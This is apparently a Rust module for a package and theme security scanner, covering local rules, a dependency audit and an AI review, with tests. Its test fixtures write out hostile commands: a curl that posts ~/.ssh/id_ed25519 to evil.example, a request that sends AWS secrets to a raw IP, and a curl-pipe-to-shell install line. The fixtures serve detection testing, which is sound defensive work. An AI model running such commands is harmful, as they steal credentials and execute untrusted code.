//! The review pipeline shared by every command: local rules, dependency
//! audit, then the OpenCode review through the review engine.

use std::path::Path;

use crate::agent::{SourceFile, Status};
use crate::config::Settings;
use crate::config::model::{AgentSettings, AiRequirement, Named, SourceClass};
use crate::deps;
use crate::engine::baseline::{Identity, Unit};
use crate::engine::{self, Group, Memory};
use crate::mask;
use crate::osv;
use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report};
use crate::rules::{self, RuleId, Scheme};
use crate::scan::{self, FileKind, ScanConfig, TextFile};
use crate::tools::OpenCode;

const EXCERPT_CHARS: usize = 180;
const LFS_POINTER: &str = "version https://git-lfs.github.com/spec/v1";

/// What one review runs against: the settings, the class the target itself
/// belongs to, and where to find OpenCode.
pub struct ReviewContext<'a> {
    pub settings: &'a Settings,
    pub class: SourceClass,
    pub opencode: &'a OpenCode,
    /// What the target is remembered as; empty for `<class>:<canonical path>`.
    pub units: &'a [Unit],
    /// The review-memory store; `None` reviews without it.
    pub state_root: Option<&'a Path>,
    /// Facts for the AI review (see `Request::context`).
    pub context: &'a [String],
}

/// Reviews a file or directory tree as one source class.
pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
    let mut report = collected_report(config.root.display().to_string(), context);

    let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
        analyze_text(&mut report, file.rel, file.text, true);
    });
    report.snapshot = snapshot;
    report.gaps.extend(walk_gaps);
    if report.text_files_reviewed == 0 {
        report.gaps.push(Gap::NoReviewableFiles);
    }

    audit_dependencies(&mut report);
    let units = if context.units.is_empty() {
        default_units(context.class, &config.root)
    } else {
        context.units.to_vec()
    };
    review_collected(report, context, &units)
}

/// A report for files collected outside a tree walk (see `review_collected`).
pub fn collected_report(subject: impl Into<String>, context: &ReviewContext<'_>) -> Report {
    let mut report = Report::new(subject);
    report.class = context.class;
    report.profile = context
        .settings
        .profile_for(context.class)
        .name()
        .to_string();
    report.ai_off_classes = ai_off_classes(context.settings, &[context.class]);
    report
}

/// Runs the AI review of what `report` has queued, with the review memory
/// for `units`, and records an approved baseline.
pub fn review_collected(mut report: Report, context: &ReviewContext<'_>, units: &[Unit]) -> Report {
    report.context = context.context.to_vec();
    let memory = match Memory::open(
        context.settings,
        context.class,
        units.to_vec(),
        context.state_root.map(Path::to_path_buf),
    ) {
        Ok(memory) => memory,
        Err(reason) => {
            report
                .notes
                .push(format!("not used ({reason}); reviewing in full"));
            None
        }
    };
    let reviewed_with = run_agents(
        &mut report,
        context.settings,
        context.opencode,
        units,
        memory.as_ref(),
    );
    if let Some(memory) = &memory {
        let approved = reviewed_with
            .as_ref()
            .filter(|_| is_approved(&report, context.settings))
            .map(|settings| (report.agent_input.as_slice(), settings));
        let notes = engine::remember(memory, approved);
        report.notes.extend(notes);
    }
    report
}

/// The subset of `classes` whose resolved policy has `ai = off`.
pub fn ai_off_classes(settings: &Settings, classes: &[SourceClass]) -> Vec<SourceClass> {
    classes
        .iter()
        .copied()
        .filter(|class| settings.policy(*class).ai == AiRequirement::Off)
        .collect()
}

/// Applies the local checks to one text file and queues it for the AI review.
pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependencies: bool) {
    report.text_files_reviewed += 1;

    if text.lines().next() == Some(LFS_POINTER) {
        report.gaps.push(Gap::UnresolvedLfs(rel.to_string()));
    }
    queue_for_agent(report, rel, text);

    let documentation = rules::is_documentation(rel);
    let inventory_network = !documentation && rules::is_executable_or_runtime_config(rel);
    if !documentation {
        let masked = mask::lines(rel, text);
        for (index, (line, view)) in text.lines().zip(&masked).enumerate() {
            let number = index + 1;
            if inventory_network {
                record_network(report, rel, number, line, &view.quiet);
            }
            let code = view.code.to_lowercase();
            let quiet = view.quiet.to_lowercase();
            for rule in rules::line_rules(&code, &quiet) {
                push_finding(report, rel, number, line, rule);
            }
        }
    }

    if inspect_dependencies {
        deps::inspect(&mut report.dependencies, &mut report.gaps, rel, text);
    }
}

/// Queues a package payload file that acts on its own (see `payload`) for
/// the AI review only. The local rules are written for scripts and code;
/// these files are where legitimate services, rules and privileges live, so
/// the rules' matches on them are noise. Returns whether it was queued: a
/// class with `ai = off` does not review payload files at all.
pub fn analyze_payload(report: &mut Report, rel: &str, text: &str) -> bool {
    if report.ai_off_classes.contains(&report.class_of(rel)) {
        return false;
    }
    report.text_files_reviewed += 1;
    queue_for_agent(report, rel, text);
    true
}

fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
    if report.ai_off_classes.contains(&report.class_of(rel)) {
        return;
    }
    if rules::is_sensitive_path(rel) {
        report.gaps.push(Gap::SensitiveWithheld(rel.to_string()));
        return;
    }
    report.agent_input.push(SourceFile {
        path: rel.to_string(),
        content: text.to_string(),
    });
}

/// Records the destinations in `active`, the line without comments and
/// printed messages; `line` is the original, shown as the excerpt.
fn record_network(report: &mut Report, rel: &str, number: usize, line: &str, active: &str) {
    for (scheme, host) in rules::extract_network_destinations(active) {
        if !rules::is_local_host(&host) {
            if scheme == Scheme::Http {
                push_finding(report, rel, number, line, RuleId::CleartextNetworkRequest);
            }
            if rules::is_ip_host(&host) {
                push_finding(report, rel, number, line, RuleId::DirectIpNetworkRequest);
            }
        }
        report.network.push(NetworkRequest {
            path: rel.to_string(),
            line: number,
            scheme,
            host,
        });
    }
}

fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule: RuleId) {
    report.findings.push(LocalFinding {
        path: rel.to_string(),
        line: number,
        rule,
        excerpt: line.trim().chars().take(EXCERPT_CHARS).collect(),
    });
}

fn audit_dependencies(report: &mut Report) {
    deps::check_coverage(&report.dependencies, &mut report.gaps);
    let packages = report.dependencies.packages();
    if packages.is_empty() {
        return;
    }
    match osv::audit(packages) {
        Ok(audit) => report.audit = Some(audit),
        Err(error) => report.gaps.push(Gap::Dependency(format!(
            "OSV dependency audit failed: {error}"
        ))),
    }
}

/// Runs the AI review for every file whose class policy wants one. Files
/// whose classes resolve to the same agent settings share one plan. A tree
/// with an oversized text file is already incomplete, so nothing is sent.
///
/// Returns the agent settings every queued file was reviewed with, or
/// `None` when nothing was reviewed or the files needed more than one set
/// of settings (a baseline is bound to one set, so such a review is never
/// recorded as one).
pub fn run_agents(
    report: &mut Report,
    settings: &Settings,
    opencode: &OpenCode,
    units: &[Unit],
    memory: Option<&Memory>,
) -> Option<AgentSettings> {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || has_oversized {
        return None;
    }

    let mut groups: Vec<(AgentSettings, Vec<SourceFile>)> = Vec::new();
    for file in &report.agent_input {
        let class = report.class_of(&file.path);
        if settings.policy(class).ai == AiRequirement::Off {
            continue;
        }
        let agent_settings = settings.agent_settings(class);
        match groups
            .iter_mut()
            .find(|(existing, _)| *existing == agent_settings)
        {
            Some((_, files)) => files.push(file.clone()),
            None => groups.push((agent_settings, vec![file.clone()])),
        }
    }

    let reviewed_with = match groups.as_slice() {
        [(only, files)] if files.len() == report.agent_input.len() => Some(only.clone()),
        _ => None,
    };
    for (agent_settings, files) in groups {
        let findings: Vec<LocalFinding> = report
            .findings
            .iter()
            .filter(|finding| files.iter().any(|file| file.path == finding.path))
            .cloned()
            .collect();
        let group = Group {
            settings: &agent_settings,
            class: group_class(report, &files),
            files: &files,
            findings: &findings,
            units,
            context: &report.context,
        };
        let reviewed = engine::review_group(&group, opencode, memory);
        report.notes.extend(reviewed.notes);
        if reviewed.too_large && !report.agent_input_overflowed {
            report.agent_input_overflowed = true;
            report.gaps.push(Gap::AgentInputTooLarge);
        }
        if let Some(error) = reviewed.invalid {
            report.gaps.push(Gap::Agent(error));
        }
        report.agent_runs.extend(reviewed.runs);
    }
    reviewed_with
}

/// The class a group is reviewed as: its files' class when they share one,
/// else the report's (the strictest pacman class for a transaction).
fn group_class(report: &Report, files: &[SourceFile]) -> SourceClass {
    let mut classes = files.iter().map(|file| report.class_of(&file.path));
    let first = classes.next().unwrap_or(report.class);
    if classes.all(|class| class == first) {
        first
    } else {
        report.class
    }
}

/// Without `--identity` or `--unit`, a target is remembered by its class
/// and canonical path.
fn default_units(class: SourceClass, root: &Path) -> Vec<Unit> {
    root.canonicalize()
        .ok()
        .and_then(|path| path.to_str().map(|path| format!("{}:{path}", class.name())))
        .and_then(|text| Identity::parse(&text).ok())
        .map(|identity| {
            vec![Unit {
                prefix: String::new(),
                identity,
            }]
        })
        .unwrap_or_default()
}

/// A baseline is recorded only when every chunk got a clear AI verdict, the
/// report has no gaps, and the decision is clear.
fn is_approved(report: &Report, settings: &Settings) -> bool {
    report.gaps.is_empty()
        && !report.agent_runs.is_empty()
        && report.agent_runs.iter().all(|run| {
            matches!(&run.outcome, AgentOutcome::Reviewed(review) if review.status == Status::Clear)
        })
        && report.decide(&|class| settings.policy(class)) == Decision::Clear
}

#[cfg(test)]
#[expect(clippy::format_collect, reason = "test data generation")]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use super::{ReviewContext, ai_off_classes, analyze_text, review_tree, run_agents};
    use crate::agent::Status;
    use crate::config::Settings;
    use crate::config::file::{AgentDefaults, PartialConfig, PartialPolicy};
    use crate::config::model::{AiRequirement, Profile, SourceClass, builtin};
    use crate::report::{AgentOutcome, AgentRun, Blocked, Decision, Gap, Report};
    use crate::rules::RuleId;
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn rules_in(report: &Report) -> Vec<RuleId> {
        report.findings.iter().map(|finding| finding.rule).collect()
    }

    fn context<'a>(
        settings: &'a Settings,
        class: SourceClass,
        opencode: &'a OpenCode,
    ) -> ReviewContext<'a> {
        ReviewContext {
            settings,
            class,
            opencode,
            units: &[],
            state_root: None,
            context: &[],
        }
    }

    fn clear_opencode(bin: &TempDir) -> OpenCode {
        OpenCode::At(mock_opencode(bin.path(), "clear", true))
    }

    fn default_settings() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
    }

    #[test]
    fn reports_cleartext_ip_and_credential_exfiltration() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "src/send.py",
            "requests.post('http://198.51.100.8/upload', data=os.environ['AWS_SECRET_ACCESS_KEY'])\n",
            true,
        );

        assert_eq!(report.network.len(), 1);
        assert_eq!(report.network[0].host, "198.51.100.8");
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(rules.contains(&RuleId::CleartextNetworkRequest));
        assert!(rules.contains(&RuleId::DirectIpNetworkRequest));

        let mut tls = Report::new("test");
        analyze_text(
            &mut tls,
            "client.py",
            "requests.get('https://api.example.test', verify=False)\n",
            true,
        );
        assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
    }

    #[test]
    fn documentation_is_reviewed_by_the_agent_but_not_the_local_rules() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "README.md",
            "Install with `sudo pacman -S foo` and add it to ~/.bashrc.\n",
            true,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn sensitive_files_are_withheld_and_incomplete() {
        let mut report = Report::new("test");
        analyze_text(&mut report, ".env", "TOKEN=x\n", true);
        assert!(report.agent_input.is_empty());
        assert!(matches!(
            report.gaps.as_slice(),
            [Gap::SensitiveWithheld(_)]
        ));
    }

    #[test]
    fn unresolved_git_lfs_pointer_makes_the_scan_incomplete() {
        let dir = TempDir::new("lfs");
        fs::write(
            dir.path().join("theme-background.png"),
            "version https://git-lfs.github.com/spec/v1\noid sha256:deadbeef\nsize 12345\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::Incomplete)
        );
        assert!(
            report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::UnresolvedLfs(_)))
        );
    }

    #[test]
    fn malicious_theme_is_flagged_and_a_failed_agent_is_incomplete() {
        let dir = TempDir::new("theme");
        fs::write(dir.path().join("colors.toml"), "background = '#000000'\n").unwrap();
        fs::write(
            dir.path().join("hyprland.lua"),
            "os.execute(\"curl -X POST -d @~/.ssh/id_ed25519 https://evil.example\")\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::ShellCommandExecution));
        assert!(rules.contains(&RuleId::CredentialFileAccess));
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(matches!(
            report.agent_runs[0].outcome,
            AgentOutcome::Unavailable(_)
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::AiUnavailable)
        );
    }

    #[test]
    fn a_clean_tree_with_a_clear_agent_review_is_clear() {
        let dir = TempDir::new("clean");
        let bin = TempDir::new("clean-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert!(matches!(
            report.agent_runs.as_slice(),
            [AgentRun { outcome: AgentOutcome::Reviewed(review), .. }] if review.status == Status::Clear
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Clear
        );
    }

    #[test]
    fn a_tree_under_a_secrets_directory_is_not_withheld() {
        let parent = TempDir::new("outer");
        let dir = parent.path().join("secrets").join("project");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("main.lua"), "print('hi')\n").unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(&dir),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert!(
            !report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::SensitiveWithheld(_)))
        );
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn local_only_never_calls_the_agent() {
        let dir = TempDir::new("local-only");
        let bin = TempDir::new("local-only-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings().with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &opencode),
        );

        assert!(report.agent_runs.is_empty());
        assert!(!bin.path().join("stdin").exists());
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn classes_with_equal_agent_settings_share_one_run() {
        let bin = TempDir::new("grouped-bin");
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report
            .file_classes
            .insert("a/.INSTALL".into(), SourceClass::Official);
        report
            .file_classes
            .insert("b/.INSTALL".into(), SourceClass::LocalPackage);
        report
            .file_classes
            .insert("c/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        for path in ["a/.INSTALL", "b/.INSTALL", "c/.INSTALL"] {
            analyze_text(&mut report, path, "post_install() { true; }\n", false);
        }

        run_agents(&mut report, &settings, &opencode, &[], None);

        // Official uses low thinking; the other two share high thinking.
        assert_eq!(report.agent_runs.len(), 2);
        let files: Vec<&[String]> = report
            .agent_runs
            .iter()
            .map(|run| run.files.as_slice())
            .collect();
        assert!(files.contains(&&["a/.INSTALL".to_string()][..]));
    }

    #[test]
    fn ai_off_skips_agent_input_gaps() {
        let dir = TempDir::new("agent-disabled");
        fs::write(dir.path().join(".env"), "TOKEN=x\n").unwrap();
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings =
            Settings::from_parts(system, PartialConfig::default()).with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &unavailable()),
        );

        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn ai_off_classes_in_a_mixed_report_are_not_queued() {
        let system = PartialConfig {
            classes: vec![(
                SourceClass::Official,
                PartialPolicy {
                    ai: Some(AiRequirement::Off),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report.ai_off_classes = ai_off_classes(
            &settings,
            &[SourceClass::Official, SourceClass::ThirdPartyRepo],
        );
        assert_eq!(report.ai_off_classes, [SourceClass::Official]);

        report
            .file_classes
            .insert("core/a/.INSTALL".into(), SourceClass::Official);
        analyze_text(
            &mut report,
            "core/a/.INSTALL",
            &"a".repeat(40 * 1024),
            false,
        );
        analyze_text(
            &mut report,
            "chaotic/b/.INSTALL",
            "post_install() { true; }\n",
            false,
        );

        let queued: Vec<&str> = report
            .agent_input
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(queued, ["chaotic/b/.INSTALL"]);
        assert!(!report.agent_input_overflowed);
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
    }

    #[test]
    fn large_sources_are_reviewed_in_chunks() {
        let dir = TempDir::new("chunks");
        let bin = TempDir::new("chunks-bin");
        for name in ["one.txt", "two.txt", "three.txt"] {
            fs::write(dir.path().join(name), "a".repeat(200 * 1024)).unwrap();
        }
        let opencode = clear_opencode(&bin);
        let settings = default_settings();

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );

        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(report.agent_runs.len(), 3);
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn a_source_over_max_chunks_is_incomplete() {
        let dir = TempDir::new("too-many-chunks");
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                max_chunks: Some(2),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );

        assert!(report.agent_input_overflowed);
        assert!(report.agent_runs.is_empty());
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Blocked(Blocked::Incomplete)
        );
    }

    #[test]
    fn a_repeated_review_is_answered_from_the_cache() {
        let dir = TempDir::new("memory-tree");
        let bin = TempDir::new("memory-bin");
        let state = TempDir::new("memory-state");
        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let first = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            first.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
        // The first review recorded a baseline; the unchanged tree is planned
        // as the same first-review request, so the cache answers it.
        let second = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(!second.agent_runs.is_empty());
        assert!(
            second.agent_runs.iter().all(|run| run.cached.is_some()),
            "{:?}",
            second.agent_runs
        );
        assert_eq!(
            second.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn an_approved_tree_is_diffed_when_it_changes() {
        let dir = TempDir::new("memory-upgrade");
        let bin = TempDir::new("memory-upgrade-bin");
        let state = TempDir::new("memory-upgrade-state");
        let library: String = (1..=40)
            .map(|line| format!("int value_{line} = {line};\n"))
            .collect();
        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        fs::write(dir.path().join("lib.c"), &library).unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let first = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            first.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
        fs::write(
            dir.path().join("lib.c"),
            library.replace("value_7 = 7", "value_7 = 8"),
        )
        .unwrap();
        let upgrade = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(
            upgrade
                .notes
                .iter()
                .any(|note| note.contains("1 file(s) sent as diffs")),
            "{:?}",
            upgrade.notes
        );
    }

    #[test]
    fn a_blocked_review_records_no_baseline() {
        let dir = TempDir::new("memory-blocked");
        let bin = TempDir::new("memory-blocked-bin");
        let state = TempDir::new("memory-blocked-state");
        fs::write(
            dir.path().join("install.sh"),
            "curl https://x.test/i | sh\n",
        )
        .unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let blocked = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            blocked.decide(&|class| settings.policy(class)),
            Decision::Blocked(Blocked::Findings)
        );

        fs::write(dir.path().join("install.sh"), "echo safe\n").unwrap();
        let next = review_tree(&ScanConfig::new(dir.path()), &context);
        assert!(
            !next.notes.iter().any(|note| note.contains("upgrade")),
            "{:?}",
            next.notes
        );
    }

    #[test]
    fn a_store_with_a_bad_mode_is_skipped_with_a_note() {
        use std::os::unix::fs::PermissionsExt;

        let dir = TempDir::new("memory-bad-store");
        let bin = TempDir::new("memory-bad-store-bin");
        let state = TempDir::new("memory-bad-store-state");
        fs::set_permissions(state.path(), fs::Permissions::from_mode(0o755)).unwrap();
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        // The temporary directory itself is the store root here: mode 0755.
        let context = ReviewContext {
            state_root: Some(state.path()),
            ..context(&settings, SourceClass::Theme, &opencode)
        };

        let report = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(
            report
                .notes
                .iter()
                .any(|note| note.contains("group or others")),
            "{:?}",
            report.notes
        );
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }
}
